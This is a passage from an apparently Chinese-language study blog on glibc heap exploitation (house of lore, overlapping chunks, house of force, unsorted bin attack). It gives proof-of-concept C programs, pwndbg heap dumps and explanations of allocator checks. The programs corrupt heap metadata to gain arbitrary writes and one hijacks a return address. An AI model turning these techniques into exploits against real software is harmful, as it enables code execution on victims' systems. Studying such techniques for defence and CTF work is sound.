         &quot;the small one during the free()\n&quot;);
  void *p5 &#x3D; malloc(1000);
  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);


  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
  free((void*)victim);

  fprintf(stderr, &quot;\nIn the unsorted bin the victim&#39;s fwd and bk pointers are nil\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  fprintf(stderr, &quot;Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin\n&quot;);
  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim);

  void *p2 &#x3D; malloc(1200);
  fprintf(stderr, &quot;The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2);

  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  &#x2F;&#x2F;------------VULNERABILITY-----------

  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);

  victim[1] &#x3D; (intptr_t)stack_buffer_1; &#x2F;&#x2F; victim-&gt;bk is pointing to stack

  &#x2F;&#x2F;------------------------------------

  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);
  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);

  void *p3 &#x3D; malloc(0x100);


  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);
  char *p4 &#x3D; malloc(0x100);
  fprintf(stderr, &quot;p4 &#x3D; malloc(0x100)\n&quot;);

  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,
         stack_buffer_2[2]);

  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); &#x2F;&#x2F; this chunk will be allocated on stack
  intptr_t sc &#x3D; (intptr_t)jackpot; &#x2F;&#x2F; Emulating our in-memory shellcode
  memcpy((p4+40), &amp;sc, 8); &#x2F;&#x2F; This bypasses stack-smash detection since it jumps over the canary

  &#x2F;&#x2F; sanity check
  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>small bin</code>之后在栈上伪造以该堆为起点的链，包含两个<code>fake chunk</code>,伪造过程即修改三个堆的<code>fd</code>和<code>bk</code>区域的位置，这样就可以绕过<code>small bin</code> 对<code>fd</code>以及需要申请的<code>fake chunk</code>不能在<code>small bin</code>链的尾部的检查，申请相同大小的堆即可将<code>fake chunk</code>申请出来。</p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)
        &#123;
          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;
            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">else
           &#123;
             bck &#x3D; victim-&gt;bk;
if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))
               &#123;
                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;
                 goto errout;
               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p>
<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
 A simple tale of overlapping chunk.
 This technique is taken from
 http:&#x2F;&#x2F;www.contextis.com&#x2F;documents&#x2F;120&#x2F;Glibc_Adventures-The_Forgotten_Chunks.pdf
*&#x2F;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

int main(int argc , char* argv[])&#123;


	intptr_t *p1,*p2,*p3,*p4;

	fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem\n\n&quot;);
	fprintf(stderr, &quot;Let&#39;s start to allocate 3 chunks on the heap\n&quot;);

	p1 &#x3D; malloc(0x100 - 8);
	p2 &#x3D; malloc(0x100 - 8);
	p3 &#x3D; malloc(0x80 - 8);

	fprintf(stderr, &quot;The 3 chunks have been allocated here:\np1&#x3D;%p\np2&#x3D;%p\np3&#x3D;%p\n&quot;, p1, p2, p3);

	memset(p1, &#39;1&#39;, 0x100 - 8);
	memset(p2, &#39;2&#39;, 0x100 - 8);
	memset(p3, &#39;3&#39;, 0x80 - 8);

	fprintf(stderr, &quot;\nNow let&#39;s free the chunk p2\n&quot;);
	free(p2);
	fprintf(stderr, &quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;);

	fprintf(stderr, &quot;Now let&#39;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;);
	fprintf(stderr, &quot;For a toy program, the value of the last 3 bits is unimportant;&quot;
		&quot; however, it is best to maintain the stability of the heap.\n&quot;);
	fprintf(stderr, &quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;
		&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;);

	int evil_chunk_size &#x3D; 0x181;
	int evil_region_size &#x3D; 0x180 - 8;
	fprintf(stderr, &quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;,
		 evil_chunk_size, evil_region_size);

	*(p2-1) &#x3D; evil_chunk_size; &#x2F;&#x2F; we are overwriting the &quot;size&quot; field of chunk p2

	fprintf(stderr, &quot;\nNow let&#39;s allocate another chunk with a size equal to the data\n&quot;
	       &quot;size of the chunk p2 injected size\n&quot;);
	fprintf(stderr, &quot;This malloc will be served from the previously freed chunk that\n&quot;
	       &quot;is parked in the unsorted bin which size has been modified by us\n&quot;);
	p4 &#x3D; malloc(evil_region_size);

	fprintf(stderr, &quot;\np4 has been allocated at %p and ends at %p\n&quot;, (char *)p4, (char *)p4+evil_region_size);
	fprintf(stderr, &quot;p3 starts at %p and ends at %p\n&quot;, (char *)p3, (char *)p3+0x80-8);
	fprintf(stderr, &quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;);

	fprintf(stderr, &quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;
		&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;);

	fprintf(stderr, &quot;Let&#39;s run through an example. Right now, we have:\n&quot;);
	fprintf(stderr, &quot;p4 &#x3D; %s\n&quot;, (char *)p4);
	fprintf(stderr, &quot;p3 &#x3D; %s\n&quot;, (char *)p3);

	fprintf(stderr, &quot;\nIf we memset(p4, &#39;4&#39;, %d), we have:\n&quot;, evil_region_size);
	memset(p4, &#39;4&#39;, evil_region_size);
	fprintf(stderr, &quot;p4 &#x3D; %s\n&quot;, (char *)p4);
	fprintf(stderr, &quot;p3 &#x3D; %s\n&quot;, (char *)p3);

	fprintf(stderr, &quot;\nAnd if we then memset(p3, &#39;3&#39;, 80), we have:\n&quot;);
	memset(p3, &#39;3&#39;, 80);
	fprintf(stderr, &quot;p4 &#x3D; %s\n&quot;, (char *)p4);
	fprintf(stderr, &quot;p3 &#x3D; %s\n&quot;, (char *)p3);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个实际大小为<code>0x101</code>的堆和一个<code>0x81</code>的堆，释放第二个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x101
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555b200
Size: 0x80

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将被释放的堆的大小改成第二、三个堆的大小之和， 此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将该堆申请出来即可实现<code>overlap</code>,即申请的堆包含了初始的第三个堆且可向其写入数据</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p>
<h1 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
 Yet another simple tale of overlapping chunk.
 This technique is taken from
 https:&#x2F;&#x2F;loccs.sjtu.edu.cn&#x2F;wiki&#x2F;lib&#x2F;exe&#x2F;fetch.php?media&#x3D;gossip:overview:ptmalloc_camera.pdf.
 
 This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
*&#x2F;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()&#123;
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use &#x3D; 0x1;

  fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem&quot;);
  fprintf(stderr, &quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;);
  fprintf(stderr, &quot;\nLet&#39;s start to allocate 5 chunks on the heap:&quot;);

  p1 &#x3D; malloc(1000);
  p2 &#x3D; malloc(1000);
  p3 &#x3D; malloc(1000);
  p4 &#x3D; malloc(1000);
  p5 &#x3D; malloc(1000);

  real_size_p1 &#x3D; malloc_usable_size(p1);
  real_size_p2 &#x3D; malloc_usable_size(p2);
  real_size_p3 &#x3D; malloc_usable_size(p3);
  real_size_p4 &#x3D; malloc_usable_size(p4);
  real_size_p5 &#x3D; malloc_usable_size(p5);

  fprintf(stderr, &quot;\n\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, &quot;\nchunk p2 from %p to %p&quot;, p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, &quot;\nchunk p3 from %p to %p&quot;, p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, &quot;\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, &quot;\nchunk p5 from %p to %p\n&quot;, p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,&#39;A&#39;,real_size_p1);
  memset(p2,&#39;B&#39;,real_size_p2);
  memset(p3,&#39;C&#39;,real_size_p3);
  memset(p4,&#39;D&#39;,real_size_p4);
  memset(p5,&#39;E&#39;,real_size_p5);
  
  fprintf(stderr, &quot;\nLet&#39;s free the chunk p4.\nIn this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;); 
  
  free(p4);

  fprintf(stderr, &quot;\nLet&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;);

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) &#x3D; real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; &#x2F;&#x2F;&lt;--- BUG HERE 

  fprintf(stderr, &quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;);
  fprintf(stderr, &quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;);
  free(p2);
  
  fprintf(stderr, &quot;\nNow let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;);

  p6 &#x3D; malloc(2000);
  real_size_p6 &#x3D; malloc_usable_size(p6);

  fprintf(stderr, &quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;);
  fprintf(stderr, &quot;\nchunk p6 from %p to %p&quot;, p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, &quot;\nchunk p3 from %p to %p\n&quot;, p3, (unsigned char *) p3+real_size_p3); 

  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 

  fprintf(stderr, &quot;\nLet&#39;s write something inside p6\n&quot;);
  memset(p6,&#39;F&#39;,1500);  
  
  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建5个堆，释放第四个堆，将第二个堆的大小改成二三两个堆大小之和，此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆并申请回来，此时第二、三、四个堆会被合并成一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三个堆始终没有被操作，而新创建的堆可以堆第三个堆进行读写，形成<code>overlap</code></p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* consolidate forward *&#x2F;
      if (!nextinuse) &#123;
	unlink(av, nextchunk, bck, fwd);
	size +&#x3D; nextsize;
      &#125; else
	clear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p>
<p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p>
<p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p>
<h1 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">  
&#x2F;*
   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http:&#x2F;&#x2F;phrack.org&#x2F;issues&#x2F;66&#x2F;10.html )
   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04
*&#x2F;


#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
&#123;
	fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);
	fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);
	fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;
		&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);

	fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);
	fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);



	fprintf(stderr, &quot;\nLet&#39;s allocate the first chunk, taking space from the wilderness.\n&quot;);
	intptr_t *p1 &#x3D; malloc(256);
	fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - 2);

	fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk&#x2F;wilderness.\n&quot;);
	int real_size &#x3D; malloc_usable_size(p1);
	fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);

	fprintf(stderr, &quot;\nNow let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);

	&#x2F;&#x2F;----- VULNERABILITY ----
	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);

	fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);
	fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;
	fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	&#x2F;&#x2F;------------------------

	fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;
	   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;
	   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);

	&#x2F;*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top &#x3D; old_top + nb
	 * nb &#x3D; new_top - old_top
	 * req + 2sizeof(long) &#x3D; new_top - old_top
	 * req &#x3D; new_top - old_top - 2sizeof(long)
	 * req &#x3D; dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req &#x3D; dest - old_top - 4*sizeof(long)
	 *&#x2F;
	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;
	   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);
	void *new_ptr &#x3D; malloc(evil_size);
	fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);

	void* ctr_chunk &#x3D; malloc(100);
	fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);
	fprintf(stderr, &quot;malloc(100) &#x3D;&gt; %p!\n&quot;, ctr_chunk);
	fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);

	fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);
	fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);
	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
	fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);

	assert(ctr_chunk &#x3D;&#x3D; bss_var);


	&#x2F;&#x2F; some further discussion:
	&#x2F;&#x2F;fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size &#x3D; malloc_got_address - 8 - p2_guessed\n\n&quot;);
	&#x2F;&#x2F;fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;
	&#x2F;&#x2F;	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);
	&#x2F;&#x2F;fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 &#x3D; p2_guessed + evil_size\n\n&quot;);
	&#x2F;&#x2F;fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);
	&#x2F;&#x2F;fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;
	&#x2F;&#x2F;	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 &#x3D; malloc_got_address\n\n&quot;);

	&#x2F;&#x2F;fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);
	&#x2F;&#x2F;fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8&#x3D;0x%08x\n&quot;,malloc_got_address);

	&#x2F;&#x2F;fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件：可以溢出到top_chunk、可以申请任意大小的堆块</p>
<p>首先创建了一个堆，并溢出到<code>top chunk</code>将<code>size</code>改成<code>-1</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x55555555c110
Size: 0xffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>计算要覆写的地址和<code>top chunk</code>的差并减去<code>chunk header</code>的大小，申请该大小的堆，即把所需地址之前的空间都申请完，因此下一个申请的堆<code>user data</code>处即为要覆写的区域</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk			#申请完所求地址之前的所有空间
Addr: 0x555555558000
Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()&#123;
	fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;);
	fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;
		   &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);

	unsigned long stack_var&#x3D;0;
	fprintf(stderr, &quot;Let&#39;s first look at the target we want to rewrite on stack:\n&quot;);
	fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);

	unsigned long *p&#x3D;malloc(400);
	fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p);
	fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;
           &quot;the first one during the free()\n\n&quot;);
	malloc(500);

	free(p);
	fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;
		   &quot;point to %p\n&quot;,(void*)p[1]);

	&#x2F;&#x2F;------------VULNERABILITY-----------

	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);
	fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);
	fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]);

	&#x2F;&#x2F;------------------------------------

	malloc(400);
	fprintf(stderr, &quot;Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;
		   &quot;rewritten:\n&quot;);
	fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前提：控制unsorted bin的bk指针</p>
<p>目的：实现修改任意地址值为一个较大的数值，但是数值不受控制</p>
<ul>
<li>通过修改循环的次数来使得程序可以执行多次循环</li>
